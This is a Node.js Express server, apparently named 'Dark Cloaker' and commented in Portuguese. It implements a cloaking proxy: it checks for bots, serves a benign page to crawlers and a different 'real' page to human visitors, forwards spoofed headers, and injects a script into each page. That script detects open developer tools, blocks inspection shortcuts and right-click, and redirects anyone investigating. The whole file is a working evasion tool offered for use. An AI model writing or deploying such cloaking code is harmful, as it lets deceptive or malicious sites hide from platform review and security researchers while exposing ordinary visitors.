require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const axios = require("axios");
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");
const Domain = require("./models/Domain");

const app = express();

// 🔒 Segurança básica
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔌 Rotas da API
const authRoutes = require("./routes/auth.routes");
const domainRoutes = require("./routes/domain.routes");
app.use("/api/auth", authRoutes);
app.use("/api/domain", domainRoutes);

// 🧠 Banco Mongo
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// 🛡️ Middleware de Cloaking (proxy cego)
app.use(async (req, res, next) => {
  try {
    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    // 🕵️ Detector de bot
    const isBotVisit = isBot(ua, ip);
    const urlAlvo = isBotVisit ? domain.baseUrl : domain.realUrl;
    const destino = `${urlAlvo}${req.originalUrl}`;

    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: req.get("referer") || '',
    };

    const response = await axios.get(destino, { headers });
    const html = response.data;

    // 🧪 Script Anti-devtools e clonagem
    const antiDebug = `
      <script>
        function devtoolsDetector(){
          const s = performance.now(); debugger; const e = performance.now();
          if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
        }
        setInterval(devtoolsDetector, 1000);
        document.addEventListener('keydown', function(e){
          if(
            e.key==='F12' ||
            (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
            (e.ctrlKey && e.key==='U')
          ){
            e.preventDefault(); window.location.href='${domain.fallbackUrl}';
          }
        });
        document.addEventListener('contextmenu', e=>{
          e.preventDefault(); alert('🚫 Proibido clonar!');
        });
      </script>
    `;

    let mutado = mutateHTMLSafe(html);
    mutado = mutado.replace("</body>", `${antiDebug}</body>`);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.send(mutado);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err.message);
    return res.redirect("https://google.com");
  }
});

// 🚀 Start do servidor
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
});
